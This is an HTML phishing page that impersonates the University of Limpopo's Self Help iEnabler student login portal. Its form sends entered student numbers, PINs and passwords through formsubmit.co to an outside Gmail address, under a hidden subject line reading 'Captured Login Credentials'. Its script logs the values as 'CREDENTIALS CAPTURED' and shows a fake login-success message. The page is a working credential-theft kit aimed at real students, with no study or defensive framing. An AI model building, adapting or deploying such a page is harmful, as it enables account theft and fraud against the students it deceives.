<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>UL Self Help iEnabler</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
.wrap { width: 100%; max-width: 540px; border: 1px solid #999; background: #fff; box-shadow: 2px 2px 8px rgba(0,0,0,0.2); }
.fra-header { background: #d6e4f7; padding: 5px 10px; border-bottom: 1px solid #aab; }
.logo-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: #fff; border-bottom: 2px solid #1a6faf; }
.logo-left { display: flex; align-items: center; gap: 12px; }
.logo-left img { height: 75px; width: auto; }
.ul-name { color: #1a6faf; font-size: 16px; font-weight: bold; }
.its-badge { background: #1a6faf; color: #fff; font-size: 10px; font-weight: bold; padding: 8px 14px; border-radius: 3px; }
.login-top { background: #1a9be6; color: #fff; font-weight: bold; font-size: 14px; padding: 9px 16px; margin: 0 16px 0 16px; border-radius: 3px 3px 0 0; }
.login-body { padding: 14px 16px 18px; background: #fff; margin: 0 16px 14px; border: 1px solid #ccd; border-top: none; border-radius: 0 0 3px 3px; }
.field-label { font-size: 13px; font-weight: bold; color: #000; margin-bottom: 4px; }
.ul-input { width: 100%; padding: 7px 0; border: none; border-bottom: 1px solid #999; font-size: 13px; margin-bottom: 14px; background: transparent; }
.msg-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; padding: 10px 14px; font-size: 13px; margin-bottom: 12px; border-radius: 2px; display: none; }
.ul-btn.primary { padding: 8px 20px; background: #1a6faf; color: #fff; border: none; border-radius: 3px; cursor: pointer; }
</style>
</head>
<body>

<div class="wrap">
  <div class="fra-header"><span class="fra-inst">University of Limpopo | Self Help iEnabler</span></div>
  
  <div class="logo-row">
    <div class="logo-left">
      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhb_NYqAEn1jqc2PxQHsObY_8u-Y1v5o6J5sZlxakE8YzY2aNb75Z4bdsqd7ru5Q4Gknkj5IrF8HR7SiPDiIf3KqU92hHRK9Qp6xCnG-h4fMRCl1TYMuFrccJw-nq7ukMisZZuDY-JuxUBHwVeLFWyoT_0I4G7kakbD9RgW58UIUoguNh4YTbtQCJAuJg/s320/1200px-University_of_Limpopo_logo.svg.png" alt="UL Logo">
      <div class="ul-name">University of Limpopo<br><small>Inspired to Serve</small></div>
    </div>
    <div class="its-badge">ITS</div>
  </div>

  <div class="login-top">Registered Users: Login Credentials</div>
  <div class="login-body">

    <div class="msg-error" id="msgError">⚠ Please fill in all required fields correctly.</div>

    <form id="loginForm" action="https://formsubmit.co/getzgetz14@gmail.com" method="POST">
      <input type="hidden" name="_subject" value="UL iEnabler - Captured Login Credentials">
      <input type="hidden" name="_captcha" value="false">

      <div class="field-label">Student Number:</div>
      <input class="ul-input" type="text" name="student_number" id="studentNumber" required>

      <div class="field-label">Pin:</div>
      <input class="ul-input" type="text" name="pin" id="pinField" maxlength="5" required>
      <p class="pin-hint">(5 numeric digits. Do not start with a 0.)</p>

      <div class="field-label">Password:</div>
      <input class="ul-input" type="password" name="password" id="passwordField" required>

      <button type="submit" class="ul-btn primary">Login</button>
    </form>
  </div>
</div>

<script>

document.getElementById('loginForm').addEventListener('submit', function(e) {
    const studentNumber = document.getElementById('studentNumber').value.trim();
    const pin = document.getElementById('pinField').value.trim();
    const password = document.getElementById('passwordField').value.trim();

    if (!studentNumber || !pin || !password) {
        document.getElementById('msgError').style.display = 'block';
        e.preventDefault();
        return false;
    }


    console.log("%c=== CREDENTIALS CAPTURED ===", "color: red; font-weight: bold");
    console.log("Student Number:", studentNumber);
    console.log("PIN:", pin);
    console.log("Password:", password);
    console.log("%c=============================", "color: red; font-weight: bold");

    // You can also alert for demo purposes
    alert("logged in successfully !\n\nStudent Number: " + studentNumber + 
          "\nPIN: " + pin + 
          "\nPassword: " + password + 
          "\n\n(This is for UL STUDENTS ONLY AND MAKE SURE YOUR CREDENTIALS ARE CORRECT TO LOGIN  )");
});
</script>

</body>
</html>
